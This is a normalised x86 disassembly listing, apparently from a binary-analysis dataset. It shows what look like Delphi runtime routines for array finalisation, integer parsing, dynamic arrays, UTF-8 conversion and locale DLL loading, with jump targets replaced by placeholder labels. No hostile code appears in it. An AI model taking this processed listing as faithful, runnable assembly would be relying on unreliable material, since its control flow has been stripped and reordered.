mov edx [ edx ]
call sub_4049c8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_40497c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4058d0
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_405224
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402838
sub_404ad8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028d8
mov edx [ eax + esi ]
add eax ebx
call sub_403f94
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_40465c
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404ac0
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028d8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404bf4
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404ad8
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4058e8
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405260
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404bf4
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403f94
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40465c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404ac0
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404bf4
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404ad8
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4058e8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405260
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404d14
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404d38
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402918
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402918
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404d14
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_404f98
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404f90
jmp r-xdata
mov al 0x4
call sub_402838
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402838
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40271c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b80
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_4049c8
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028d8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b80
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404f78
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404f98
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_405130
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_404f90
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
test edi edi
jge r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov eax [ eax ]
cmp eax edi
jge r-xdata
add esi edi
xor edi edi
mov edx eax
sub edx edi
cmp esi edx
jle r-xdata
mov edi eax
test esi esi
jge r-xdata
mov esi edx
test esi esi
jle r-xdata
xor esi esi
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x1 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x6 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax esi
imul [ ebp - 0xc ]
add eax 0x8
call sub_4026dc
mov ebx eax
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] esi
add ebx 0x4
imul edi [ ebp - 0xc ]
add [ ebp - 0x4 ] edi
test esi esi
jle r-xdata
mov ecx esi
imul ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4028d8
mov edx esi
imul edx [ ebp - 0xc ]
mov eax ebx
xor ecx ecx
call sub_402b80
push esi
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404f78
jmp r-xdata
sub_405224
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026fc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_4049c8
sub_405260
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_405224
pop edx
pop eax
sub_405288
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012ec
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4052b8
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40127c
mov eax esp
mov dl 0x1
call sub_4054f4
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405300
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_4052b8
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_40533c
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401284
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40128c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405328
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405328
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405328
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40125c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401254
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4054f4
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40127c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012d4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4055f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_40533c
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012dc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012d4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012dc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012d4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40129c
push eax
call sub_401274
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405794
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026fc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026fc
jmp r-xdata
sub_4057f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_40582f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405860
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4058c4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4057f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4058cb
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4058e8
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405914
test edx edx
je sub_4058d0
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402838
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4059b8
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_401314
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4059e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405abc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405bf4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f40
mov eax ebx
xor edx edx
call sub_404798
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c9a
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
call sub_40478c
lea edx [ eax + eax * 2 ]
